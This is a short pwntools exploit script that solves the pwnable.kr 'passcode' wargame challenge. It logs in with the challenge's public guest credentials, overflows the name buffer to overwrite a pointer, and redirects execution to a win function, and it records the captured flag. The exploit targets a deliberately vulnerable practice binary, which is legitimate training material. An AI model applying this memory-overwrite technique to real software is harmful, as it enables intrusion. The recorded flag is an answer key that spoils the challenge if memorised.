#!/usr/bin/env python3
from pwn import *

padding = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXX'
addr2overwrite = p32(0x804a004)
win_addr = 0x80485D7

name = padding + addr2overwrite

tunnel = ssh(user = "passcode", host="pwnable.kr", port=2222, password="guest")
io = tunnel.run('./passcode')

io.recv(timeout=1)
io.sendline(name)
io.recvline()
io.sendline(str(win_addr))
io.recvline()
io.interactive()

# FLAG: Sorry mom.. I got confused about scanf usage :(
